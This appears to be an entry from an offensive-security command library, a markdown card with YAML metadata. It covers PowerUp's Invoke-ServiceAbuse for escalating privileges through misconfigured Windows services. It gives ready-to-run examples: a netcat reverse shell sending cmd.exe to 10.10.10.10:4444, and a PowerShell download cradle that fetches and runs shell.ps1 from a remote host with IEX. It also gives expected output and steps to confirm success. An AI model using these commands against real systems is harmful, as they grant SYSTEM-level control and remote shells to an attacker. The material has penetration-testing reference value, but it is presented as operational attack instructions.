---
id: 0a62ea9e-4c05-4f58-becb-1ea5d5505cd8
name: powershell-invoke-serviceabuse
type: command
executor: powershell
data: Invoke-ServiceAbuse -Name $_SERVICE_NAME -Command "$_PAYLOAD_COMMAND"
output: null
created_at: '2023-04-06T03:56:29.682792+00:00'
updated_at: '2023-04-10T20:37:34.119569+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - exploit
verified: true
validated: true
---

# powershell-invoke-serviceabuse

## Command

```powershell
Invoke-ServiceAbuse -Name $_SERVICE_NAME -Command "$_PAYLOAD_COMMAND"
```

## Description

This PowerUp function abuses a vulnerable Windows service (e.g., unquoted path or weak permissions) by modifying its binary path to execute a specified command with the service's privileges (often SYSTEM). It must be run in a PowerShell session where PowerUp.ps1 is loaded. Commonly used after identifying targets via Invoke-AllChecks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Name | Service name to abuse (e.g., 'BBSvc') | Yes |
| -Command | Payload command to execute (e.g., reverse shell) | Yes |

## Examples

### Basic Usage (Netcat Reverse Shell)

```powershell
Invoke-ServiceAbuse -Name 'BBSvc' -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

### Advanced Usage (PowerShell DownloadCradle)

```powershell
Invoke-ServiceAbuse -Name 'BBSvc' -Command "powershell.exe -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')"
```

## Expected Output

The command outputs the service modification details:

[*] Modifying service 'BBSvc' binary path...
New Binary Path: C:\Windows\system32\cmd.exe /c <payload>
[*] Service abused successfully. Restart service to execute.

Success: No errors; verify by restarting service (`sc start BBSvc`) and checking listener for connection.

## Related

- [[procedures/Windows-Privilege-Escalation-Unquoted-Service-Paths]]
- [[commands/powershell-invoke-powerup-allchecks]]
